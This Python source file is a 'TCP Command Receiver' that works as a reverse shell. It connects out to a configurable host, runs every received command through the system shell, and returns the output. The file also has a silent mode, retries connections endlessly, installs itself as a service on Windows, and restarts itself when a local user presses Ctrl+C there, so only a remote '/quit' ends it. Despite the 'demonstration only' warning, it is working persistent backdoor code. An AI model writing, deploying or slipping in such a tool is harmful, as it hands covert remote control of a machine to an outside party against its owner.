#!/usr/bin/env python3
"""
TCP Command Receiver
Connects to a TCP sender and executes received commands.
"""

import socket
import sys
import time
import subprocess

# Configuration
VERBOSE = True  # Set to False for silent operation
DEFAULT_HOST = "127.0.0.1"  # Sender's address
DEFAULT_PORT = 5555  # Port number
RETRY_DELAY = 5  # Seconds between connection retries
BUFFER_SIZE = 4096  # Socket buffer size
END_MARKER = b"<<<END_OF_OUTPUT>>>"  # Command completion marker

# Use the system's output encoding
DECODING = sys.stdout.encoding if sys.stdout.encoding else "utf-8"


def log(msg: str) -> None:
    """Print message only if VERBOSE is True."""
    if VERBOSE:
        print(msg)


def execute_command_stream(command: str, client_socket, working_dir: str = None) -> str:
    """
    Executes a command and streams output back through the socket.

    Automatically appends '&& pwd' (Unix) or '&& cd' (Windows) to track directory changes.
    The pwd/cd output is hidden from the sender (used only for internal tracking).
    Returns the current working directory after command execution.

    WARNING: Uses shell=True for demonstration purposes only.
    This allows arbitrary command execution and should NEVER be exposed
    to untrusted networks or users.

    Args:
        command: The command to execute
        client_socket: Socket to stream output to
        working_dir: Current working directory (None = use receiver's cwd)

    Returns:
        The current working directory after command execution
    """
    import platform

    # Check if this is a clear/cls command (special handling)
    is_clear_command = command.strip().lower() in ["clear", "cls"]

    # Determine pwd command based on OS
    system = platform.system()
    pwd_command = "cd" if system == "Windows" else "pwd"

    # For clear commands, don't append pwd tracking (it causes issues)
    # Just return the current working_dir unchanged
    if is_clear_command:
        command_to_run = command
        track_directory = False
    else:
        command_to_run = f"{command} && {pwd_command}"
        track_directory = True

    try:
        # Use subprocess.Popen to manage the process and pipes
        process = subprocess.Popen(
            command_to_run,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            cwd=working_dir,
        )

        # Buffer all output lines
        output_lines = []
        if process.stdout:
            for raw_line in process.stdout:
                # Decode the line
                line = raw_line.decode(DECODING, errors="replace")
                output_lines.append(line)

        # Wait for process to finish
        return_code = process.wait()

        # Extract directory info from last line (if tracking and command succeeded)
        new_dir = working_dir
        if track_directory and output_lines and return_code == 0:
            # Only extract directory if command succeeded (prevents using error messages as paths)
            # Find the last non-empty line (the pwd/cd output)
            for i in range(len(output_lines) - 1, -1, -1):
                stripped = output_lines[i].strip()
                if stripped:
                    new_dir = stripped
                    # Remove the pwd line from output (don't send to sender)
                    output_lines.pop(i)
                    break

        # Send all output to sender (excluding the pwd line)
        for line in output_lines:
            client_socket.sendall(line.encode("utf-8"))

        # Send final status
        if return_code != 0:
            status = f"\n[exit code: {return_code}]\n"
            client_socket.sendall(status.encode("utf-8"))

        # Send end marker
        client_socket.sendall(END_MARKER)

        # Return the current directory
        return new_dir if new_dir else working_dir

    except Exception as e:
        error_msg = f"\n[error: {e}]\n" + END_MARKER.decode("utf-8")
        # Send error to sender (don't print locally)
        try:
            client_socket.sendall(error_msg.encode("utf-8"))
        except:
            pass  # Socket already closed, nothing we can do

        # On error, return the previous working_dir unchanged
        return working_dir


def start_receiver(host: str = DEFAULT_HOST, port: int = DEFAULT_PORT) -> None:
    """
    Start the TCP command receiver client.

    Args:
        host: The sender's host address (use '127.0.0.1' for local testing)
        port: The sender's port number
    """
    attempt = 1

    try:
        # Main reconnection loop - runs until user interrupts
        while True:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            connected = False

            # Try to connect to the sender, with retries
            while not connected:
                try:
                    log(f"Connecting to {host}:{port}... (attempt {attempt})")
                    client_socket.connect((host, port))
                    connected = True
                    log(f"Connected to {host}:{port}")
                    log("Ready to execute commands (Ctrl+C to exit)\n")
                except ConnectionRefusedError:
                    log(f"Connection refused, retrying in {RETRY_DELAY}s...\n")
                    time.sleep(RETRY_DELAY)
                    attempt += 1
                    client_socket.close()
                    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                except socket.gaierror:
                    print(f"Invalid host address: {host}")
                    sys.exit(1)

            # Reset attempt counter after successful connection
            attempt = 1

            # Track current working directory (None = use receiver's default cwd)
            current_dir = None

            # Continuously receive and execute commands
            connection_lost = False
            try:
                while True:
                    try:
                        # Receive command
                        data = client_socket.recv(BUFFER_SIZE)

                        if not data:
                            # Connection closed by sender
                            log("\nConnection closed")
                            log("Reconnecting...\n")
                            connection_lost = True
                            break

                        # Decode the command
                        command = data.decode("utf-8").strip()

                        # Handle special commands
                        if command.strip().lower() == "/quit":
                            log("Received /quit command - uninstalling service and shutting down...")

                            # Send acknowledgment
                            msg = "\n[Uninstalling service and shutting down...]\n"
                            client_socket.sendall(msg.encode("utf-8"))
                            client_socket.sendall(END_MARKER)

                            # Uninstall the service
                            import platform

                            uninstall_receiver_service()

                            # Exit completely (don't reconnect)
                            log("Service uninstalled. Exiting.")
                            sys.exit(0)

                        log(f"$ {command}")

                        # Execute command and stream output back
                        # Update current_dir with the new working directory after execution
                        current_dir = execute_command_stream(command, client_socket, current_dir)

                    except ConnectionResetError:
                        log("\nConnection reset")
                        log("Reconnecting...\n")
                        connection_lost = True
                        break
                    except Exception as e:
                        log(f"\nError: {e}")
                        log("Reconnecting...\n")
                        connection_lost = True
                        break
            finally:
                client_socket.close()

            # If connection was lost, continue to outer loop to reconnect
            if not connection_lost:
                break

    except KeyboardInterrupt:
        import platform

        if platform.system() == "Windows":
            log("\n\nReceiver interrupted - restarting...")
            sys.exit(1)  # Non-zero exit triggers service restart
        else:
            log("\n\nExiting...")
            sys.exit(0)  # Clean exit on macOS/Linux
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)


def uninstall_receiver_service() -> None:
    """Uninstall the auto-start service for this receiver."""
    import platform
    import subprocess

    system = platform.system()

    if system == "Linux":
        log("Uninstalling systemd service...")
        commands = [
            ["sudo", "systemctl", "stop", "tcp-receiver.service"],
            ["sudo", "systemctl", "disable", "tcp-receiver.service"],
            ["sudo", "rm", "-f", "/etc/systemd/system/tcp-receiver.service"],
            ["sudo", "systemctl", "daemon-reload"],
        ]
        for cmd in commands:
            subprocess.run(cmd, capture_output=True)
        log("Systemd service uninstalled.")

    elif system == "Windows":
        log("Uninstalling Windows Task...")
        subprocess.run(["schtasks", "/delete", "/tn", "TCPReceiver", "/f"], capture_output=True)
        log("Windows Task uninstalled.")

    elif system == "Darwin":
        log("Uninstalling launchd service...")
        plist_file = "/Library/LaunchDaemons/com.tcp.receiver.plist"
        commands = [
            ["sudo", "launchctl", "unload", plist_file],
            ["sudo", "rm", "-f", plist_file],
        ]
        for cmd in commands:
            subprocess.run(cmd, capture_output=True)
        log("Launchd service uninstalled.")

    else:
        log(f"Uninstall not implemented for {system}")


def run_with_auto_restart(host: str, port: int) -> None:
    """
    Wrapper that automatically restarts the receiver if it crashes.
    Used in daemon mode for crash recovery.

    Windows: Only /quit command can permanently stop the receiver.
    macOS/Linux: Ctrl+C exits cleanly (normal behavior).
    """
    import platform

    system = platform.system()
    restart_count = 0

    while True:
        try:
            if restart_count > 0:
                log(f"\n[ Restarting receiver (attempt #{restart_count}) ]\n")
            start_receiver(host, port)
            # If we get here, it exited cleanly (only from /quit command)
            break

        except KeyboardInterrupt:
            # Platform-specific behavior
            if system == "Windows":
                # Windows: Treat Ctrl+C as a crash - restart the receiver
                restart_count += 1
                log("\n\nReceiver interrupted with Ctrl+C")
                log(f"Auto-restarting in {RETRY_DELAY} seconds...")
                time.sleep(RETRY_DELAY)
            else:
                # macOS/Linux: Allow clean exit
                log("\n\nExiting...")
                break

        except Exception as e:
            restart_count += 1
            log(f"\n\nReceiver crashed: {e}")
            log(f"Auto-restarting in {RETRY_DELAY} seconds...")
            time.sleep(RETRY_DELAY)


if __name__ == "__main__":
    log("\n[ TCP Command Receiver ]\n")

    # Windows: Check if installed as service, install if not
    import platform

    if platform.system() == "Windows":
        try:
            from install import check_and_install_service

            check_and_install_service()
        except Exception as e:
            log(f"Warning: Could not check/install service: {e}")
            log("Continuing anyway...\n")

    # Run with auto-restart wrapper for crash recovery
    run_with_auto_restart(DEFAULT_HOST, DEFAULT_PORT)
